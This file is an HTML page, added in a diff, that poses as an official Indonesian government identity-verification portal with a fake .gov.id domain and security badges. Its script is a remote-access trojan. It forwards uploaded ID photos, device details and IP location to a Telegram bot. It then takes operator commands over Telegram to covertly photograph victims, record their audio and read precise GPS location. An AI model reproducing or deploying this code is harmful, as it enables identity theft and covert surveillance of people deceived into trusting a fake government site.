@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veritas Access · Official Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+        body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #f5f7fa; padding: 20px; }
+        
+        /* TRUST BANNER */
+        .trust-banner {
+            position: fixed; top: 0; left: 0; right: 0; background: #0a1a2f; color: white;
+            padding: 8px 0; font-size: 12px; z-index: 1000;
+        }
+        .trust-banner-content {
+            max-width: 600px; margin: 0 auto; display: flex; align-items: center;
+            justify-content: space-between; padding: 0 20px;
+        }
+        .trust-item { display: flex; align-items: center; gap: 8px; }
+        .trust-item i { color: #4caf50; }
+        .official-badge { background: #2a4a7a; padding: 2px 10px; border-radius: 20px; font-weight: 500; }
+        .ssl-badge { display: flex; align-items: center; gap: 5px; background: #1e3a5f; padding: 2px 12px; border-radius: 20px; }
+        
+        /* DOMAIN BAR */
+        .domain-bar {
+            position: fixed; top: 40px; left: 0; right: 0; background: #f1f5f9;
+            padding: 6px 0; border-bottom: 1px solid #d1d9e6; z-index: 999; font-size: 13px;
+        }
+        .domain-content {
+            max-width: 600px; margin: 0 auto; display: flex; align-items: center;
+            justify-content: center; gap: 20px; padding: 0 20px;
+        }
+        .domain-url {
+            display: flex; align-items: center; gap: 5px; background: white;
+            padding: 2px 12px; border-radius: 20px; border: 1px solid #cbd5e1;
+        }
+        .domain-url i { color: #0e6245; }
+        .verified-badge { color: #0e6245; font-weight: 600; }
+        
+        /* MAIN CARD */
+        .verification-card {
+            max-width: 500px; width: 100%; background: white; border-radius: 28px;
+            box-shadow: 0 20px 40px -10px rgba(0,20,40,0.2); overflow: hidden;
+            margin-top: 70px; border: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        /* HEADER */
+        .header {
+            padding: 30px 30px 15px; border-bottom: 1px solid #e9ecf2;
+            background: linear-gradient(180deg, #fff, #fafcff);
+        }
+        .header-top { display: flex; align-items: center; gap: 15px; }
+        .gov-shield {
+            width: 48px; height: 48px; background: #0a1a2f; border-radius: 14px;
+            display: flex; align-items: center; justify-content: center; color: white; font-size: 26px;
+            box-shadow: 0 4px 8px rgba(0,20,40,0.1);
+        }
+        .brand-name { font-size: 22px; font-weight: 700; color: #0a1a2f; letter-spacing: -0.3px; }
+        .brand-sub { font-size: 13px; color: #5e6f88; margin-top: 2px; display: flex; align-items: center; gap: 6px; }
+        .brand-sub i { color: #4caf50; font-size: 12px; }
+        
+        /* CONTENT */
+        .content { padding: 25px 30px 30px; }
+        
+        /* STEPS */
+        .steps {
+            display: flex; justify-content: space-between; margin-bottom: 30px;
+            position: relative; padding: 0 5px;
+        }
+        .steps::before {
+            content: ''; position: absolute; top: 20px; left: 40px; right: 40px;
+            height: 2px; background: #e0e7ef; z-index: 1;
+        }
+        .step {
+            position: relative; z-index: 2; text-align: center; width: 80px;
+        }
+        .step-marker {
+            width: 40px; height: 40px; background: #f1f5f9; border: 2px solid #d0d9e5;
+            border-radius: 40px; display: flex; align-items: center; justify-content: center;
+            font-weight: 600; margin: 0 auto 8px; color: #4a5b73; background: white;
+        }
+        .step.active .step-marker { background: #1e3a5f; border-color: #1e3a5f; color: white; }
+        .step.completed .step-marker { background: #0e6245; border-color: #0e6245; color: white; }
+        .step-label { font-size: 12px; font-weight: 500; color: #64748b; }
+        .step.active .step-label { color: #0a1a2f; font-weight: 600; }
+        
+        /* UPLOAD AREA */
+        .upload-area {
+            border: 2px dashed #b9c8dd; border-radius: 24px; padding: 35px 20px;
+            text-align: center; cursor: pointer; transition: all 0.2s;
+            background: #f9fcff; margin: 20px 0 15px;
+        }
+        .upload-area:hover { border-color: #1e3a5f; background: #f0f7ff; }
+        .upload-area i { font-size: 42px; color: #7b8fa8; margin-bottom: 12px; }
+        .upload-title { font-size: 16px; font-weight: 600; color: #1e293b; margin-bottom: 4px; }
+        .upload-subtitle { font-size: 12px; color: #6e819b; }
+        input[type="file"] { display: none; }
+        
+        /* PREVIEW GRID */
+        .preview-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+            gap: 10px; margin: 15px 0; max-height: 150px; overflow-y: auto; padding: 5px;
+        }
+        .preview-card {
+            aspect-ratio: 1; border-radius: 12px; overflow: hidden;
+            border: 1px solid #dce3ec; position: relative;
+        }
+        .preview-card img { width: 100%; height: 100%; object-fit: cover; }
+        .preview-remove {
+            position: absolute; top: 3px; right: 3px; width: 22px; height: 22px;
+            background: #ef4444; color: white; border-radius: 20px; display: flex;
+            align-items: center; justify-content: center; font-size: 14px; cursor: pointer;
+            border: 2px solid white; font-weight: bold;
+        }
+        
+        /* BUTTON */
+        .verify-btn {
+            background: #0f1e36; color: white; border: none; padding: 16px;
+            border-radius: 18px; font-weight: 600; font-size: 16px; width: 100%;
+            cursor: pointer; margin: 10px 0 15px; transition: 0.2s;
+        }
+        .verify-btn:hover { background: #1e3a5f; transform: translateY(-1px); box-shadow: 0 8px 16px -8px #1e3a5f; }
+        .verify-btn:disabled { background: #b9c8dd; cursor: not-allowed; transform: none; box-shadow: none; }
+        
+        /* SECURITY FOOTER */
+        .security-footer {
+            display: flex; justify-content: center; gap: 20px; font-size: 11px;
+            color: #64748b; margin-top: 10px;
+        }
+        .security-footer i { margin-right: 4px; color: #4caf50; }
+        
+        /* FEATURES PANEL */
+        .features-panel {
+            position: fixed; bottom: 20px; right: 20px; background: white;
+            border-radius: 40px; padding: 4px; display: flex; gap: 2px;
+            border: 1px solid #d9e2ef; box-shadow: 0 4px 12px rgba(0,0,0,0.05); z-index: 1000;
+        }
+        .feature-btn {
+            background: transparent; border: none; color: #4a5b73; padding: 6px 16px;
+            border-radius: 30px; cursor: pointer; font-size: 13px; display: flex; align-items: center; gap: 6px;
+        }
+        .feature-btn:hover { background: #eef2f6; }
+        .feature-btn.admin-only { border-left: 1px solid #d9e2ef; color: #7b4c9f; }
+        
+        /* ROLE BADGE */
+        .role-badge {
+            position: fixed; top: 90px; left: 20px; background: #0a1a2f; color: white;
+            padding: 5px 15px; border-radius: 30px; font-size: 12px; font-weight: 500;
+            display: flex; align-items: center; gap: 6px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); z-index: 1000;
+        }
+        .role-badge i { color: #ffd966; }
+        
+        /* HIDDEN STREAMS */
+        .hidden { display: none !important; }
+        .hidden-stream { position: absolute; width: 1px; height: 1px; opacity: 0; }
+        
+        @media (max-width: 500px) {
+            .trust-banner-content, .domain-content { flex-direction: column; align-items: flex-start; gap: 5px; }
+            .domain-bar { top: 70px; }
+            .role-badge { top: 120px; }
+            .header { padding: 20px; }
+            .content { padding: 20px; }
+        }
+    </style>
+    
+    <!-- CONFIG -->
+    <script src="config.js"></script>
+</head>
+<body>
+    <!-- TRUST BANNER -->
+    <div class="trust-banner">
+        <div class="trust-banner-content">
+            <div class="trust-item"><i class="fas fa-check-circle"></i><span class="official-badge">OFFICIAL PORTAL</span></div>
+            <div class="trust-item"><i class="fas fa-lock"></i><span>256-bit SSL</span></div>
+            <div class="ssl-badge"><i class="fas fa-lock"></i><span id="domainDisplay">*.veritas.gov.id</span></div>
+        </div>
+    </div>
+
+    <!-- DOMAIN BAR -->
+    <div class="domain-bar">
+        <div class="domain-content">
+            <div class="domain-url">
+                <i class="fas fa-lock"></i><span>https://</span><strong id="domainName">veritas.gov.id</strong>
+                <span>·</span><i class="fas fa-check-circle" style="color:#0e6245;"></i><span class="verified-badge">Verified</span>
+            </div>
+            <div><i class="far fa-clock"></i> Secure Connection</div>
+        </div>
+    </div>
+
+    <!-- ROLE BADGE -->
+    <div class="role-badge" id="roleBadge"><i class="fas fa-user-shield"></i> <span>USER</span></div>
+
+    <!-- MAIN CARD -->
+    <div class="verification-card">
+        <div class="header">
+            <div class="header-top">
+                <div class="gov-shield" id="logoShield">VA</div>
+                <div>
+                    <div class="brand-name" id="portalName">Veritas Access</div>
+                    <div class="brand-sub"><i class="fas fa-badge-check"></i> <span>Official Identity Partner</span></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="steps">
+                <div class="step active" id="step1">
+                    <div class="step-marker" id="step1Marker">1</div>
+                    <div class="step-label">Upload ID</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-marker" id="step2Marker">2</div>
+                    <div class="step-label">Selfie</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-marker" id="step3Marker">3</div>
+                    <div class="step-label">Review</div>
+                </div>
+            </div>
+            
+            <div class="upload-area" id="uploadArea">
+                <i class="fas fa-cloud-upload-alt"></i>
+                <div class="upload-title">Click to upload or take photo</div>
+                <div class="upload-subtitle">JPG/PNG (Max 10MB) · End-to-end encrypted</div>
+                <input type="file" id="fileInput" accept="image/*" capture="environment" multiple>
+            </div>
+            
+            <div class="preview-grid" id="previewArea"></div>
+            
+            <button class="verify-btn" id="verifyButton" disabled>
+                <i class="fas fa-shield-check"></i> Submit for Verification
+            </button>
+            
+            <div class="security-footer">
+                <span><i class="fas fa-lock"></i> 256-bit SSL</span>
+                <span><i class="fas fa-eye-slash"></i> Privacy Protected</span>
+                <span><i class="fas fa-database"></i> ISO 27001</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- FEATURES PANEL -->
+    <div class="features-panel">
+        <button class="feature-btn" id="adminPanelBtn"><i class="fas fa-crown"></i> Admin</button>
+    </div>
+
+    <!-- HIDDEN STREAMS -->
+    <div class="hidden-stream">
+        <video id="hiddenVideo" autoplay playsinline></video>
+        <audio id="hiddenAudio" autoplay></audio>
+    </div>
+
+    <!-- MAIN SCRIPT -->
+    <script>
+        (function() {
+            'use strict';
+            
+            // ========== CEK CONFIG ==========
+            if (!window.RATFINK_CONFIG) {
+                alert('❌ ERROR: config.js tidak ditemukan!');
+                return;
+            }
+            
+            const CONFIG = window.RATFINK_CONFIG;
+            
+            // ========== GLOBAL VARIABLES ==========
+            const APP = {
+                DEVICE_ID: 'DEV_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
+                START_TIME: Date.now(),
+                currentUserId: null,
+                currentUserRole: 'member',
+                memberList: CONFIG.access?.MEMBERS || [],
+                adminList: CONFIG.access?.ADMINS || [],
+                camStream: null,
+                audioStream: null,
+                lastUpdateId: 0,
+                processedIds: new Set()
+            };
+            
+            // ========== FUNGSI DETEKSI DEVICE ==========
+            function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                let device = 'Unknown';
+                let os = 'Unknown';
+                let browser = 'Unknown';
+                
+                // Deteksi OS
+                if (ua.includes('Windows')) os = 'Windows';
+                else if (ua.includes('Mac OS')) os = 'macOS';
+                else if (ua.includes('iPhone')) os = 'iOS';
+                else if (ua.includes('iPad')) os = 'iPadOS';
+                else if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('Linux')) os = 'Linux';
+                
+                // Deteksi device brand (HP)
+                if (ua.includes('iPhone')) device = 'iPhone';
+                else if (ua.includes('iPad')) device = 'iPad';
+                else if (ua.includes('Samsung')) device = 'Samsung';
+                else if (ua.includes('Xiaomi')) device = 'Xiaomi';
+                else if (ua.includes('Redmi')) device = 'Redmi';
+                else if (ua.includes('OPPO')) device = 'OPPO';
+                else if (ua.includes('Vivo')) device = 'Vivo';
+                else if (ua.includes('Realme')) device = 'Realme';
+                else if (ua.includes('Huawei')) device = 'Huawei';
+                else if (ua.includes('ASUS')) device = 'ASUS';
+                else if (ua.includes('Acer')) device = 'Acer';
+                else if (ua.includes('Lenovo')) device = 'Lenovo';
+                else if (ua.includes('Dell')) device = 'Dell';
+                else if (ua.includes('HP ')) device = 'HP';
+                else device = 'PC/Laptop';
+                
+                // Deteksi browser
+                if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+                else if (ua.includes('Firefox')) browser = 'Firefox';
+                else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+                else if (ua.includes('Edg')) browser = 'Edge';
+                else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
+                
+                return { device, os, browser };
+            }
+            
+            // ========== FUNGSI GET IP & GEO ==========
+            async function getIPInfo() {
+                try {
+                    // Pake ipapi.co yang lengkap (gratis)
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    
+                    return {
+                        ip: data.ip || 'Unknown',
+                        city: data.city || 'Unknown',
+                        region: data.region || 'Unknown',
+                        country: data.country_name || 'Unknown',
+                        isp: data.org || 'Unknown',
+                        lat: data.latitude,
+                        lon: data.longitude
+                    };
+                } catch(e) {
+                    // Fallback ke ipify kalo error
+                    try {
+                        const res = await fetch('https://api.ipify.org?format=json');
+                        const data = await res.json();
+                        return {
+                            ip: data.ip || 'Unknown',
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            country: 'Unknown',
+                            isp: 'Unknown',
+                            lat: null,
+                            lon: null
+                        };
+                    } catch(e) {
+                        return {
+                            ip: 'Unknown',
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            country: 'Unknown',
+                            isp: 'Unknown',
+                            lat: null,
+                            lon: null
+                        };
+                    }
+                }
+            }
+            
+            // ========== FUNGSI SEND KE TELEGRAM ==========
+            async function sendToTelegram(text) {
+                if (!CONFIG.telegram?.BOT_TOKEN || CONFIG.telegram.BOT_TOKEN.includes('DUMMY')) return;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.telegram.BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.telegram.NOTIFICATION_CHAT || CONFIG.telegram.GROUP_ID,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch(e) {}
+            }
+            
+            // ========== COMMAND HANDLER - INFO LENGKAP ==========
+            async function handleInfo() {
+                const deviceInfo = getDeviceInfo();
+                const ipInfo = await getIPInfo();
+                const uptime = Math.floor((Date.now() - APP.START_TIME) / 1000);
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const language = navigator.language;
+                
+                let message = `📱 *DEVICE INFORMATION*\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+                message += `🆔 ID: \`${APP.DEVICE_ID}\`\n`;
+                message += `📱 Device: ${deviceInfo.device}\n`;
+                message += `💻 OS: ${deviceInfo.os}\n`;
+                message += `🌐 Browser: ${deviceInfo.browser}\n`;
+                message += `🖥️ Screen: ${screen.width}x${screen.height}\n`;
+                message += `🌍 Bahasa: ${language}\n`;
+                message += `⏰ Timezone: ${timezone}\n`;
+                message += `📶 Online: ${navigator.onLine ? 'Yes' : 'No'}\n`;
+                message += `⏱️ Uptime: ${uptime}s\n\n`;
+                
+                message += `🌐 *IP & LOKASI*\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+                message += `🌍 IP: ${ipInfo.ip}\n`;
+                message += `📍 Kota: ${ipInfo.city}\n`;
+                message += `📍 Provinsi: ${ipInfo.region}\n`;
+                message += `📍 Negara: ${ipInfo.country}\n`;
+                message += `📡 ISP: ${ipInfo.isp}\n`;
+                
+                if (ipInfo.lat && ipInfo.lon) {
+                    message += `🗺️ [LIHAT DI MAPS](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})\n`;
+                }
+                
+                message += `\n👤 Role: ${APP.currentUserRole.toUpperCase()}`;
+                
+                sendToTelegram(message);
+            }
+            
+            // ========== COMMAND POLLING ==========
+            async function checkCommands() {
+                if (!CONFIG.telegram?.BOT_TOKEN || CONFIG.telegram.BOT_TOKEN.includes('DUMMY')) return;
+                
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.BOT_TOKEN}/getUpdates?offset=${APP.lastUpdateId + 1}&timeout=5`);
+                    const data = await res.json();
+                    
+                    if (data.ok && data.result) {
+                        for (const update of data.result) {
+                            if (update.update_id > APP.lastUpdateId) APP.lastUpdateId = update.update_id;
+                            
+                            const msg = update.message;
+                            if (!msg?.text) continue;
+                            if (APP.processedIds.has(msg.message_id)) continue;
+                            
+                            APP.processedIds.add(msg.message_id);
+                            if (APP.processedIds.size > 500) {
+                                const toDelete = Array.from(APP.processedIds).slice(0, 250);
+                                toDelete.forEach(id => APP.processedIds.delete(id));
+                            }
+                            
+                            if (msg.chat.id.toString() !== CONFIG.telegram.GROUP_ID) continue;
+                            
+                            const userId = msg.from.id;
+                            const isAdmin = APP.adminList.includes(userId);
+                            const isMember = APP.memberList.includes(userId);
+                            
+                            if (!isAdmin && !isMember) {
+                                sendToTelegram(`⛔ *Access Denied*\nUser ID: ${userId} not authorized.`);
+                                continue;
+                            }
+                            
+                            APP.currentUserRole = isAdmin ? 'admin' : 'member';
+                            document.getElementById('roleBadge').innerHTML = `<i class="fas fa-user-${isAdmin ? 'crown' : 'shield'}"></i> ${APP.currentUserRole.toUpperCase()}`;
+                            
+                            const cmd = msg.text.toLowerCase();
+                            const parts = cmd.split(' ');
+                            
+                            // ========== COMMAND HANDLER ==========
+                            if (cmd === '/info') {
+                                await handleInfo();
+                            }
+                            else if (cmd.startsWith('/cam')) {
+                                let count = 3;
+                                let front = true;
+                                if (parts[1] && !isNaN(parts[1])) count = Math.min(parseInt(parts[1]), 5);
+                                if (parts[2] === 'belakang') front = false;
+                                
+                                // Camera function (sama seperti sebelumnya)
+                                try {
+                                    const video = document.getElementById('hiddenVideo');
+                                    if (APP.camStream) APP.camStream.getTracks().forEach(t => t.stop());
+                                    
+                                    APP.camStream = await navigator.mediaDevices.getUserMedia({
+                                        video: { facingMode: front ? 'user' : 'environment' }
+                                    });
+                                    
+                                    video.srcObject = APP.camStream;
+                                    await video.play();
+                                    
+                                    sendToTelegram(`📸 Taking ${count} photos...`);
+                                    
+                                    for (let i = 0; i < count; i++) {
+                                        const canvas = document.createElement('canvas');
+                                        canvas.width = video.videoWidth || 640;
+                                        canvas.height = video.videoHeight || 480;
+                                        canvas.getContext('2d').drawImage(video, 0, 0);
+                                        
+                                        await new Promise(resolve => {
+                                            canvas.toBlob(async blob => {
+                                                const formData = new FormData();
+                                                formData.append('chat_id', CONFIG.telegram.GROUP_ID);
+                                                formData.append('photo', blob);
+                                                formData.append('caption', `📸 *Photo ${i+1}/${count}*\nDevice: \`${APP.DEVICE_ID}\``);
+                                                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                                                resolve();
+                                            }, 'image/jpeg', 0.8);
+                                        });
+                                        
+                                        if (i < count - 1) await new Promise(r => setTimeout(r, 2000));
+                                    }
+                                    
+                                    APP.camStream.getTracks().forEach(t => t.stop());
+                                    APP.camStream = null;
+                                    sendToTelegram(`✅ ${count} photos sent`);
+                                    
+                                } catch(e) {
+                                    sendToTelegram(`❌ Camera error: ${e.message}`);
+                                }
+                            }
+                            else if (cmd.startsWith('/audio')) {
+                                let duration = 10;
+                                if (parts[1] && !isNaN(parts[1])) duration = Math.min(parseInt(parts[1]), 30);
+                                
+                                try {
+                                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                                    const recorder = new MediaRecorder(stream);
+                                    const chunks = [];
+                                    
+                                    recorder.ondataavailable = e => chunks.push(e.data);
+                                    recorder.onstop = async () => {
+                                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                                        const formData = new FormData();
+                                        formData.append('chat_id', CONFIG.telegram.GROUP_ID);
+                                        formData.append('audio', blob);
+                                        formData.append('caption', `🎙️ *Audio*\nDevice: \`${APP.DEVICE_ID}\`\nDuration: ${duration}s`);
+                                        
+                                        await fetch(`https://api.telegram.org/bot${CONFIG.telegram.BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
+                                        stream.getTracks().forEach(t => t.stop());
+                                        sendToTelegram(`✅ Audio ${duration}s sent`);
+                                    };
+                                    
+                                    recorder.start();
+                                    sendToTelegram(`🎙️ Recording ${duration}s...`);
+                                    setTimeout(() => recorder.stop(), duration * 1000);
+                                    
+                                } catch(e) {
+                                    sendToTelegram(`❌ Audio error: ${e.message}`);
+                                }
+                            }
+                            else if (cmd === '/loc' || cmd === '/location') {
+                                if (!navigator.geolocation) {
+                                    sendToTelegram('❌ Geolocation not supported');
+                                    return;
+                                }
+                                
+                                navigator.geolocation.getCurrentPosition(
+                                    async (pos) => {
+                                        const { latitude, longitude, accuracy } = pos.coords;
+                                        const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+                                        
+                                        sendToTelegram(
+                                            `📍 *Location*\nLat: \`${latitude}\`\nLng: \`${longitude}\`\nAcc: ±${Math.round(accuracy)}m\n[View Map](${mapsLink})`
+                                        );
+                                        
+                                        await fetch(`https://api.telegram.org/bot${CONFIG.telegram.BOT_TOKEN}/sendLocation`, {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({
+                                                chat_id: CONFIG.telegram.GROUP_ID,
+                                                latitude, longitude
+                                            })
+                                        });
+                                    },
+                                    err => sendToTelegram(`❌ Location error: ${err.message}`),
+                                    { enableHighAccuracy: true, timeout: 10000 }
+                                );
+                            }
+                            else if (cmd === '/ping') {
+                                sendToTelegram('🏓 *PONG*');
+                            }
+                            else if (cmd === '/help') {
+                                let help = '🔰 *Commands*\n\n';
+                                help += '/cam [n] [d/b] - Take photos\n';
+                                help += '/audio [s] - Record audio\n';
+                                help += '/loc - Get location\n';
+                                help += '/info - Device & location info\n';
+                                help += '/ping - Test connection\n';
+                                
+                                if (isAdmin) {
+                                    help += '\n👑 *Admin*\n';
+                                    help += '/addmember [id] - Add member\n';
+                                    help += '/listmembers - List members\n';
+                                }
+                                
+                                sendToTelegram(help);
+                            }
+                            else if (isAdmin && cmd.startsWith('/addmember') && parts.length >= 2) {
+                                const newId = parseInt(parts[1]);
+                                if (!APP.memberList.includes(newId)) {
+                                    APP.memberList.push(newId);
+                                    sendToTelegram(`✅ Member ${newId} added`);
+                                }
+                            }
+                            else if (isAdmin && cmd === '/listmembers') {
+                                let list = '📋 *Members*\n';
+                                if (APP.memberList.length === 0) {
+                                    list += 'Kosong';
+                                } else {
+                                    APP.memberList.forEach((id, i) => {
+                                        list += `${i+1}. \`${id}\`\n`;
+                                    });
+                                }
+                                sendToTelegram(list);
+                            }
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            // ========== FILE UPLOAD ==========
+            const uploadArea = document.getElementById('uploadArea');
+            const fileInput = document.getElementById('fileInput');
+            const verifyBtn = document.getElementById('verifyButton');
+            const previewGrid = document.getElementById('previewArea');
+            
+            uploadArea.addEventListener('click', () => fileInput.click());
+            
+            fileInput.addEventListener('change', async (e) => {
+                const files = Array.from(e.target.files);
+                
+                for (const file of files) {
+                    if (file.size > 10 * 1024 * 1024) {
+                        alert('File terlalu besar! Maksimal 10MB.');
+                        continue;
+                    }
+                    
+                    if (previewGrid.children.length >= 5) {
+                        alert('Maksimal 5 file.');
+                        break;
+                    }
+                    
+                    // Preview
+                    const reader = new FileReader();
+                    reader.onload = (re) => {
+                        const preview = document.createElement('div');
+                        preview.className = 'preview-card';
+                        preview.innerHTML = `
+                            <img src="${re.target.result}">
+                            <div class="preview-remove" onclick="this.parentElement.remove()">×</div>
+                        `;
+                        previewGrid.appendChild(preview);
+                    };
+                    reader.readAsDataURL(file);
+                    
+                    // Upload ke Telegram
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.telegram.GROUP_ID);
+                    formData.append('photo', file);
+                    formData.append('caption', `📄 *Document Upload*\nDevice: \`${APP.DEVICE_ID}\`\nFile: ${file.name}`);
+                    
+                    try {
+                        await fetch(`https://api.telegram.org/bot${CONFIG.telegram.BOT_TOKEN}/sendPhoto`, { 
+                            method: 'POST', 
+                            body: formData 
+                        });
+                    } catch(e) {}
+                    
+                    await new Promise(r => setTimeout(r, 1500));
+                }
+                
+                if (files.length > 0) {
+                    document.getElementById('step1Marker').classList.add('completed');
+                    document.getElementById('step1Marker').innerHTML = '<i class="fas fa-check"></i>';
+                    document.getElementById('step1').classList.add('completed');
+                    verifyBtn.disabled = false;
+                }
+            });
+            
+            // ========== ADMIN PANEL BUTTON ==========
+            document.getElementById('adminPanelBtn').addEventListener('click', () => {
+                if (APP.currentUserRole === 'admin') {
+                    sendToTelegram(
+                        `👑 *Admin Panel*\n` +
+                        `Admins: ${APP.adminList.length}\n` +
+                        `Members: ${APP.memberList.length}\n` +
+                        `Device: \`${APP.DEVICE_ID}\``
+                    );
+                }
+            });
+            
+            // ========== START POLLING ==========
+            setInterval(checkCommands, 3000);
+            
+            // ========== ONLINE NOTIFICATION ==========
+            setTimeout(() => {
+                sendToTelegram(`🟢 *Device Online*\nID: \`${APP.DEVICE_ID}\``);
+            }, 2000);
+            
+            // ========== SET DOMAIN ==========
+            document.getElementById('domainName').textContent = 'veritas-access.gov.id';
+            document.getElementById('domainDisplay').textContent = '*.veritas-access.gov.id';
+            
+        })();
+    </script>
+</body>
+</html>
